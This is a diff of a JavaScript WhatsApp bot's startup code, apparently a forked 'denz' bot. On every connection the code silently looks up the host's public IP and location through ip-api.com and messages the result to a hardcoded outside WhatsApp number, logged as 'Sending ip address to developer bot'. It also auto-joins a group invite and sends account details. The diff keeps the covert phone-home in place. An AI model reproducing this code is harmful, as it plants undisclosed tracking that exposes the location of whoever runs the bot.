@@ -36,14 +36,14 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
         })
      
       await denz.connect({ timeoutMs: 30 * 1000 });
-  teks = `https://chat.whatsapp.com/GWij9jRnVJy0zuUVWX5G1O`
+  teks = `https://chat.whatsapp.com`
  denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
  denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/919778383987?text=HI BRO"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("919778383987@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+       denz.sendMessage("919778383987@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/919778383987?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
